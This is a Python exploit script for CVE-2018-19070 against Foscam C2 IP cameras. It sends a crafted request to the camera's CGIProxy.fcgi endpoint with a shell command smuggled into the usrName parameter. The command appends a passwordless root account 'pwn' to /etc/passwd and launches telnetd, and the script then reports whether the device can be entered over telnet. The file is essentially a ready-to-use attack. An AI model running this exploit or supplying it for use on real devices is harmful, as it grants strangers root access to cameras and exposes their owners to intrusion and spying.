import logging
import os
import requests
import re
import sys
import subprocess

# Console colors
W = '\033[0m'  # white (normal)
R = '\033[31m' # red
G = '\033[32m' # green

def Foscam_C2_CVE_2018_19070(victim_ip):
    try:
        # perform RCE and check if payload sent successfully
        exploit_result = os_command_injection(victim_ip)
        print(exploit_result)
        if exploit_result:
            return 'Foscam_C2_CVE_2018_19070 exploit successful! A user (pwn:<blank>) has been added to Foscam C2.'
        else:
            return 'Foscam_C2_CVE_2018_19070 exploit failed!'
    except KeyboardInterrupt:
        print('\n' + 'Program exiting...')
        sys.exit()


def os_command_injection(victim_ip):
    substring = '<result>0</result>'

    # ipaddr = sys.argv[1]
    url = 'http://%s:88' % (victim_ip)
    fullurl = url + '/cgi-bin/CGIProxy.fcgi?usr=admin&pwd=&cmd=addAccount&usrName=`echo+pwn::0:0::/root:/bin/sh+%3E%3E/etc/passwd;telnetd`&usrPwd=pwned&privilege=2'

    # test = "'%s'" % (fullurl)
    command = "curl -X %s" % fullurl

    out = subprocess.Popen(["curl", "-k", fullurl],
            stdout=subprocess.PIPE, 
            stderr=subprocess.STDOUT)
    stdout,stderr = out.communicate()
    print("\n")
    print(stdout)

    bytes = substring.encode(encoding='UTF-8')

    if bytes in stdout:
        print("\nThe exploit is successful. You can now telnet into the device using %s you have given, using the username 'pwn'", victim_ip)
        return True
    else:
        print("\nThe exploit is unsuccessful")
        return False


